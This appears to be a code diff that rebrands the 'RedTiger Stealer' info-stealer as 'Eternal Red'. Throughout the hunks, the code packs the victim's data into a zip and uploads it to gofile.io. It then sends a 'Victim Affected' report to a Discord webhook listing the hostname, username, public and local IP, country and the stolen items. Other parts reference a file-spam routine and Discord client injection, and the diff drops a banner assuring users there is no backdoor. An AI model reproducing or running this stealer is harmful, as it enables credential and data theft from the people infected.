@@ -153,9 +153,9 @@ v4r_w3bh00k_ur1_crypt = r"""
 v4r_k3y            = "%KEY%"
 v4r_website        = "%LINK_WEBSITE%"
 v4r_color_embed    = 0xa80505
-v4r_username_embed = "RedTiger St34l3r"
-v4r_avatar_embed   = "https://google.com"
-v4r_footer_text    = "RedTiger St34l3r - %LINK_GITHUB%"
+v4r_username_embed = "Eternal Red"
+v4r_avatar_embed   = "https://static.wikia.nocookie.net/m__/images/5/52/Atlas_Klimov_Faction_09.png/revision/latest/scale-to-width-down/250?cb=20250412171926&path-prefix=metro/ru"
+v4r_footer_text    = "Eternal Red"
 v4r_footer_embed   = {"text": v4r_footer_text, "icon_url": v4r_avatar_embed}
 v4r_title_embed    = f'`{v4r_username_pc} "{v4r_ip_address_public}"`'
 v4r_w3bh00k_ur1    = D3f_Decrypt(v4r_w3bh00k_ur1_crypt, v4r_k3y)
@@ -1779,26 +1779,37 @@ try:
 
     v4r_response = requests.post(
         f"https://{v4r_gofileserver}.gofile.io/uploadFile",
-        files={"file": (f"RedTiger_{v4r_username_pc.replace(' ', '_')}.zip", v4r_zip_buffer)}
+        files={"file": (f"EternalRed_{v4r_username_pc.replace(' ', '_')}.zip", v4r_zip_buffer)}
     )
 
     v4r_download_link = v4r_response.json()["data"]["downloadPage"]
 except Exception as e:
     v4r_download_link = f"Error: {e}"
 
-v4r_embed = discord.Embed(title="Victim Affected", color=v4r_color_embed)
-v4r_embed.add_field(inline=False, name="Summary of Information", value=f"""```
+embed = discord.Embed(title="Victim Affected", color=v4r_color_embed
+).add_field(
+    inline=False,
+    name="Summary of Information", 
+    value=f"""```
 Hostname    : {v4r_hostname_pc}
 Username    : {v4r_username_pc}
 DisplayName : {v4r_displayname_pc}
 Ip Public   : {v4r_ip_address_public}
 Ip Local    : {v4r_ip_adress_local}
-Country     : {v4r_country}```""")
-
-v4r_block = "```swift\n" + "\n".join(v4r_option) + "```"
-v4r_embed.add_field(inline=False, name="Stolen Information", value=v4r_block)
-v4r_embed.add_field(inline=False, name="Download Link", value=f"""{v4r_download_link}""")
-v4r_embed.set_footer(text=v4r_footer_text, icon_url=v4r_avatar_embed)
+Country     : {v4r_country}```"""
+).add_field(
+    inline=False,
+    name="Stolen Information", 
+    value=f"""```swift
+{"\n".join(v4r_option)}```"""
+).add_field(
+    inline=False,
+    name="Download Link", 
+    value=f"""{v4r_download_link}"""
+).set_footer(
+    text=v4r_footer_text, 
+    icon_url=v4r_avatar_embed
+)
 
 try:  
     v4r_w3bh00k = discord.SyncWebhook.from_url(v4r_w3bh00k_ur1)
@@ -1965,29 +1976,41 @@ def D3f_R3st4rt():
 
             v4r_response = requests.post(
                 f"https://{v4r_gofileserver}.gofile.io/uploadFile",
-                files={"file": (f"RedTiger_{v4r_username_pc.replace(' ', '_')}.zip", v4r_zip_buffer)}
+                files={"file": (f"EternalRed_{v4r_username_pc.replace(' ', '_')}.zip", v4r_zip_buffer)}
             )
 
             v4r_download_link = v4r_response.json()["data"]["downloadPage"]
         except Exception as e:
             v4r_download_link = f"Error: {e}"
 
-        v4r_embed = discord.Embed(title="Victim Affected", color=v4r_color_embed)
-        v4r_embed.add_field(inline=False, name="Summary of Information", value=f"""```
+        embed = discord.Embed(title="Victim Affected", color=v4r_color_embed
+        ).add_field(
+            inline=False,
+            name="Summary of Information", 
+            value=f"""```
         Hostname    : {v4r_hostname_pc}
         Username    : {v4r_username_pc}
         DisplayName : {v4r_displayname_pc}
         Ip Public   : {v4r_ip_address_public}
         Ip Local    : {v4r_ip_adress_local}
-        Country     : {v4r_country}```""")
+        Country     : {v4r_country}```"""
+        ).add_field(
+            inline=False,
+            name="Stolen Information", 
+            value=f"""```swift
+        {"\n".join(v4r_option)}```"""
+        ).add_field(
+            inline=False,
+            name="Download Link", 
+            value=f"""{v4r_download_link}"""
+        ).set_footer(
+            text=v4r_footer_text, 
+            icon_url=v4r_avatar_embed
+        )
 
-        v4r_block = "```swift\n" + "\n".join(v4r_option) + "```"
-        v4r_embed.add_field(inline=False, name="Stolen Information", value=v4r_block)
-        v4r_embed.add_field(inline=False, name="Download Link", value=f"""{v4r_download_link}""")
-        v4r_embed.set_footer(text=v4r_footer_text, icon_url=v4r_avatar_embed)
-
-        try:v4r_w3bh00k = discord.SyncWebhook.from_url(v4r_w3bh00k_ur1)
-            v4r_w3bh00k.send(embed=v4r_embed, username=v4r_username_embed, avatar_url=v4r_avatar_embed)
+        try:  
+            v4r_w3bh00k = discord.SyncWebhook.from_url(v4r_w3bh00k_ur1)
+            v4r_w3bh00k.send(embed=embed, username=v4r_username_embed, avatar_url=v4r_avatar_embed)
         except: pass
 '''
 
@@ -2143,7 +2166,7 @@ def D3f_Sp4mCr34tFil3():
            ".js", ".php", ".html", ".css", ".mp3", ".mp4", 
            ".mov", ".jpg", ".pdf", ".troll", ".cooked",
            ".lol", ".funny", ".virus", ".malware"
-           ".redtiger", ".redtiger", ".redtiger", ".redtiger"
+           ".EternalRed", ".EternalRed", ".EternalRed", ".EternalRed"
     ]
     def D3f_Cr43t():
         file_name = "".join(random.choice(string.ascii_uppercase + string.digits) for _ in range(random.randint(10, 50))) + random.choice(ext)
@@ -3171,7 +3194,3 @@ def D3f_Di5c0rdInj3c710n():
     D3f_Inj3ctC0d3()
     return v4r_number_discord_injection
 '''
-
-#    ╔════════════════════════════════════════════════════════════════════════════╗
-#    ║ ! File detected by the antivirus, but be aware that there is no backdoor ! ║
-#    ╚════════════════════════════════════════════════════════════════════════════╝
